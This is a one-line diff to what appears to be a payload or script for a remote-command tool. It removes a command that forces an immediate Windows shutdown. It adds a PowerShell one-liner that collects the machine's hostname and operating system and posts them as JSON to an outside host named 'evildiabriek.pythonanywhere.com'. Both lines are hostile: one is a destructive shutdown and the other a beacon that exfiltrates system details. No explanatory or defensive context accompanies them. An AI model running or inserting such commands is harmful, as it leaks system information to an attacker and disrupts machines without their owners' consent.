@@ -1,1 +1,1 @@
-ExecuteCmd -user -cmd shutdown /s /t 0
+ExecuteCmd -user -cmd powershell -c "$h=$env:COMPUTERNAME; $os=(Get-WmiObject Win32_OperatingSystem).Caption; Invoke-WebRequest -Uri 'http://evildiabriek.pythonanywhere.com/ping' -Method POST -Body ('{\"hostname\":\"'+$h+'\",\"os\":\"'+$os+'\"}') -ContentType 'application/json'"
